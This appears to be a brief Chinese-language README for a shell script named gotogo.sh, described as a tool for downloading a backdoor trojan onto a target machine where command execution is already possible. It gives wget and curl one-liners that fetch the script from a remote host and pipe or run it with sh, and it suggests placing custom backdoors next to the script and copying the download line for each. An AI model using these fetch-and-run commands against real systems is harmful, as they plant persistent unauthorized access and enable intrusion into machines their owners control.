sh 脚本
用于在可以执行命令的机器上，下载相关后台木马
如果目标系统存在 wget  ： wget http://xxx.com/gotogo.sh -O- | sh
如果目标系统存在 curl  ： curl http://192.168.95.128:8000/gotogo.sh --output gotogo.sh;sh gotogo.sh
可以补充自定义的后门
只是提供一个想法
将后门部门添加到与 gotogo.sh 同级就行
然后修改gotogo.sh 的脚本，复制下载语句即可

